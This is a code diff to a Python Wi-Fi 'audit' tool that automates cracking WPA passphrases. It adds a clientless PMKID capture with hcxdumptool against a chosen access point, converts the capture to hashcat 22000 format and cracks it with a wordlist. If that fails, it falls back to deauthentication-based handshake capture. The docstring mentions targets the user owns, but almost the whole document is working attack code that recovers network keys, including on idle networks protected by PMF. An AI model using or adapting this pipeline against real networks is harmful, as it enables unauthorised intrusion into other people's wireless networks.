@@ -89,6 +89,7 @@ class AuditResult:
     key: str | None
     capture_path: str | None = None
     hashcat_path: str | None = None
+    pmkid_captured: bool = False
 
 
 # --- output parsing (pure, unit-tested) -----------------------------------
@@ -245,6 +246,15 @@ def parse_hashcat_key(show_output: str) -> str | None:
         if line:
             return line
     return None
+
+
+def hc22000_has_pmkid(hc22000_text: str) -> bool:
+    """True if the hashcat 22000 text contains a PMKID line.
+
+    In the 22000 format a line beginning `WPA*01*` is a PMKID; `WPA*02*` is a
+    captured EAPOL handshake.
+    """
+    return any(line.strip().startswith("WPA*01*") for line in hc22000_text.splitlines())
 
 
 # --- orchestration --------------------------------------------------------
@@ -585,12 +595,76 @@ class WifiAuditor:
         if not cap_path.exists():
             return None, None
         self.captures_dir.mkdir(parents=True, exist_ok=True)
-        stamp = self._now().strftime("%Y%m%d-%H%M%S")
-        safe_essid = re.sub(r"[^A-Za-z0-9._-]+", "_", essid or "unknown").strip("_") or "unknown"
-        base = f"{safe_essid}_{bssid.replace(':', '-')}_{stamp}"
-        saved = self.captures_dir / f"{base}.cap"
+        saved = self.captures_dir / f"{self._capture_basename(bssid, essid)}.cap"
         shutil.copy2(cap_path, saved)
         return str(saved), self._export_hashcat(saved)
+
+    def _capture_basename(self, bssid: str, essid: str | None) -> str:
+        """`<essid>_<bssid>_<timestamp>` — a filesystem-safe, non-clobbering base
+        name shared by retained handshake and PMKID captures."""
+        stamp = self._now().strftime("%Y%m%d-%H%M%S")
+        safe_essid = re.sub(r"[^A-Za-z0-9._-]+", "_", essid or "unknown").strip("_") or "unknown"
+        return f"{safe_essid}_{bssid.replace(':', '-')}_{stamp}"
+
+    def capture_pmkid(self, bssid: str, channel: str, essid: str | None = None,
+                      seconds: int = 20) -> tuple[str | None, str | None]:
+        """Attempt a clientless PMKID capture against one AP.
+
+        Runs hcxdumptool (which associates to the AP to elicit EAPOL M1 with the
+        PMKID) targeted at bssid/channel for `seconds`, converts the pcapng to
+        hashcat 22000 with hcxpcapngtool, and — if a PMKID line is present —
+        retains both under captures_dir. Returns (saved_pcapng, saved_hc22000),
+        or (None, None) when no PMKID was obtained or the tools aren't installed.
+
+        No deauth and no associated client is required, so this works on idle
+        APs and past PMF/802.11w where the deauth handshake path can't.
+
+        NOTE: hcxdumptool's CLI is version-sensitive and it wants to manage the
+        radio itself; the exact flags/interface here may need tuning on the box.
+        """
+        self._clear_captures("pmkid")
+        iface = self.monitor or self.interface
+        pcapng = self.workdir / "pmkid.pcapng"
+        filter_file = self.workdir / "pmkid_targets.txt"
+        filter_file.write_text(bssid + "\n")
+        cmd = [
+            "hcxdumptool", "-i", iface, "-c", str(channel), "-w", str(pcapng),
+            "--filterlist_ap", str(filter_file), "--filtermode", "2",
+        ]
+        try:
+            dump = self._popen(
+                cmd, stdin=subprocess.DEVNULL,
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            )
+        except FileNotFoundError:
+            return None, None  # hcxdumptool not installed
+        try:
+            self._sleep(seconds)
+        finally:
+            dump.terminate()
+            try:
+                dump.wait(timeout=5)
+            except Exception:
+                pass
+        if not pcapng.exists():
+            return None, None
+        hc = self.workdir / "pmkid.hc22000"
+        try:
+            self._runner(
+                ["hcxpcapngtool", "-o", str(hc), str(pcapng)],
+                capture_output=True, text=True,
+            )
+        except FileNotFoundError:
+            return None, None  # hcxtools not installed
+        if not hc.exists() or not hc22000_has_pmkid(hc.read_text(errors="replace")):
+            return None, None
+        self.captures_dir.mkdir(parents=True, exist_ok=True)
+        base = self._capture_basename(bssid, essid)
+        saved_pcap = self.captures_dir / f"{base}_pmkid.pcapng"
+        saved_hc = self.captures_dir / f"{base}_pmkid.hc22000"
+        shutil.copy2(pcapng, saved_pcap)
+        shutil.copy2(hc, saved_hc)
+        return str(saved_pcap), str(saved_hc)
 
     def _export_hashcat(self, cap_path: Path) -> str | None:
         """Convert the capture's EAPOL handshake to hashcat 22000 format.
@@ -719,11 +793,17 @@ class WifiAuditor:
         deauth_rounds: int = 4,
         deauth_count: int = 5,
         scan_seconds: int = 15,
+        pmkid: bool = True,
+        pmkid_seconds: int = 20,
         on_scan_update=None,
         on_capture_update=None,
         verbose: bool = True,
     ) -> AuditResult:
         """Run the full automated pipeline against a single target you own.
+
+        Tries a clientless PMKID capture first (unless `pmkid` is False), then
+        falls back to the deauth handshake capture. Either yields a hashcat
+        22000 hash that is cracked against `wordlist`.
 
         `verbose` prints one-line stage milestones to stderr; turn it off when a
         live display already shows progress, to avoid fighting its redraw.
@@ -741,6 +821,22 @@ class WifiAuditor:
                 bssid, channel, essid, scan_seconds,
                 on_scan_update=on_scan_update, verbose=verbose,
             )
+            if pmkid:
+                if verbose:
+                    print(f"[*] Target {bssid} (ch {channel}) — trying PMKID (clientless) ...",
+                          file=sys.stderr)
+                pmkid_pcap, pmkid_hc = self.capture_pmkid(
+                    bssid, channel, essid=essid, seconds=pmkid_seconds,
+                )
+                if pmkid_hc:
+                    key = self.crack(pmkid_pcap, bssid, wordlist, hashcat_path=pmkid_hc)
+                    result = AuditResult(
+                        bssid=bssid, essid=essid, handshake_captured=False,
+                        pmkid_captured=True, key=key,
+                        capture_path=pmkid_pcap, hashcat_path=pmkid_hc,
+                    )
+                    return result
+
             if verbose:
                 print(f"[*] Target {bssid} (ch {channel}) — capturing handshake ...", file=sys.stderr)
             cap_path, captured = self.capture_handshake(
@@ -754,12 +850,13 @@ class WifiAuditor:
                 self.crack(cap_path, bssid, wordlist, hashcat_path=hashcat_path)
                 if captured else None
             )
+            result = AuditResult(
+                bssid=bssid, essid=essid, handshake_captured=captured, key=key,
+                capture_path=saved_cap, hashcat_path=hashcat_path,
+            )
         finally:
             self.disable_monitor()
-        return AuditResult(
-            bssid=bssid, essid=essid, handshake_captured=captured, key=key,
-            capture_path=saved_cap, hashcat_path=hashcat_path,
-        )
+        return result
 
 
 # --- live display ---------------------------------------------------------
@@ -939,6 +1036,14 @@ def build_parser() -> argparse.ArgumentParser:
         help="Deauth frames sent per round (aireplay-ng --deauth)",
     )
     parser.add_argument(
+        "--no-pmkid", action="store_true",
+        help="Skip the clientless PMKID attempt; go straight to deauth handshake capture",
+    )
+    parser.add_argument(
+        "--pmkid-time", type=int, default=20,
+        help="Seconds to attempt a PMKID capture before falling back (default 20)",
+    )
+    parser.add_argument(
         "--workdir", default="/tmp/autocrack", help="Scratch directory for in-progress capture files"
     )
     parser.add_argument(
@@ -1046,6 +1151,8 @@ def main(argv: list[str] | None = None) -> int:
             deauth_rounds=args.deauth_rounds,
             deauth_count=args.deauth_count,
             scan_seconds=args.scan_time,
+            pmkid=not args.no_pmkid,
+            pmkid_seconds=args.pmkid_time,
             on_scan_update=on_scan,
             on_capture_update=on_capture,
             verbose=not live,
@@ -1057,19 +1164,23 @@ def main(argv: list[str] | None = None) -> int:
     finally:
         display.finish()
 
-    if not result.handshake_captured:
-        print("[-] No handshake captured. Try more deauth rounds or a busier time.")
+    if not (result.handshake_captured or result.pmkid_captured):
+        print("[-] No PMKID or handshake captured. Try --no-pmkid, more deauth "
+              "rounds, or a busier time.")
         return 1
 
-    if result.capture_path:
+    if result.pmkid_captured:
+        print(f"[+] PMKID captured (clientless): {result.capture_path}")
+    elif result.capture_path:
         print(f"[+] Handshake saved: {result.capture_path}")
     if result.hashcat_path:
         print(f"[+] Hashcat (22000): {result.hashcat_path}")
     elif result.capture_path:
         print("    (install hcxtools for a hashcat .hc22000 export)")
 
+    kind = "PMKID" if result.pmkid_captured else "Handshake"
     if result.key is None:
-        print("[-] Handshake captured but passphrase not in wordlist "
+        print(f"[-] {kind} captured but passphrase not in wordlist "
               "(crack the saved capture later with a bigger list / hashcat).")
         return 1
     print(f"[+] KEY FOUND for {result.bssid}: {result.key}")
